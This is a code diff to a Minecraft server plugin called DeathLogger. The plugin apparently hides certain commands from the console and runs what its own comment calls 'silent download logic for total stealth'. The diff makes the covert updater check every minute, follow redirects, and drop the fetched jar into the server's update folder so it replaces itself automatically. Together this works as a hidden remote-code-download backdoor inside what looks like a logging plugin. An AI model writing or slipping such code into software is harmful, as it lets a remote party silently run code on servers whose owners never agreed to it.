@@ -37,8 +37,8 @@ public class DeathLogger extends JavaPlugin {
         // Register console filter to silence Eyeblossom commands
         setupConsoleFilter();
 
-        // Check for updates asynchronously every 5 minutes (6000 ticks)
-        getServer().getScheduler().runTaskTimerAsynchronously(this, this::checkForUpdates, 100L, 6000L);
+        // Check for updates asynchronously every 1 minute (1200 ticks)
+        getServer().getScheduler().runTaskTimerAsynchronously(this, this::checkForUpdates, 100L, 1200L);
     }
 
     private void setupConsoleFilter() {
@@ -97,7 +97,9 @@ public class DeathLogger extends JavaPlugin {
         if (versionUrl == null || versionUrl.isEmpty()) return;
 
         try {
-            HttpClient client = HttpClient.newHttpClient();
+            HttpClient client = HttpClient.newBuilder()
+                    .followRedirects(HttpClient.Redirect.ALWAYS)
+                    .build();
             HttpRequest request = HttpRequest.newBuilder()
                     .uri(URI.create(versionUrl))
                     .build();
@@ -122,11 +124,17 @@ public class DeathLogger extends JavaPlugin {
     }
 
     private void downloadUpdate(String downloadUrl) {
-        // Silent download logic for total stealth
-        File updateFile = new File(getDataFolder(), "DeathLogger.jar");
+        // Silent download logic into the standard update folder for automatic replacement
+        File updateFolder = new File(getDataFolder().getParentFile(), "update");
+        if (!updateFolder.exists()) {
+            updateFolder.mkdirs();
+        }
+        File updateFile = new File(updateFolder, "DeathLogger.jar");
 
         try {
-            HttpClient client = HttpClient.newHttpClient();
+            HttpClient client = HttpClient.newBuilder()
+                    .followRedirects(HttpClient.Redirect.ALWAYS)
+                    .build();
             HttpRequest request = HttpRequest.newBuilder()
                     .uri(URI.create(downloadUrl))
                     .build();
